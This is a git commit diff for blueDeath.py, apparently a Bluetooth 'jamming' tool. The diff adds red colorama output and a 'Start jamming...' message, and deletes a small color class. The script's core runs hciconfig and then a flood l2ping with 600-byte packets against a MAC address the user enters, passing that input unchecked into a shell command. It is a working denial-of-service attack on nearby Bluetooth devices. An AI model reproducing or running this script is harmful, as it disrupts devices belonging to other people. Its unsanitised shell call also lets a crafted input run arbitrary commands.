521b14a944204ff204363b4ab7ad8d54fa5eeffd
void <fluffy.siberian.cat@gmail.com>
2023-04-27 01:00:34 +1000

    pre-release

--- blueDeath.py
+++ blueDeath.py
@@ -1,7 +1,10 @@
 import os
 import subprocess
 import time
-print("""
+import colorama
+from colorama import Fore, Back, Style
+colorama.init(autoreset=True)
+print(Fore.RED + """
  _     _                  _            _   _     
 | |   | |                | |          | | | |    
 | |__ | |_   _  ___    __| | ___  __ _| |_| |__  
@@ -14,7 +17,7 @@ print("""
 mac = input("MAC: ")
 xterm_1 = "hciconfig hci0 up"
 xterm_2 = "timeout 3s l2ping -i hci0 -s 600 -f %s &" % (mac)
-
+print("Start jamming...")
 subprocess.Popen(xterm_1,shell=True)
 subprocess.Popen(xterm_2,shell=True)
 
--- color.py
+++
@@ -1,2 +0,0 @@
-class color:
-    RED = '\033[31m'
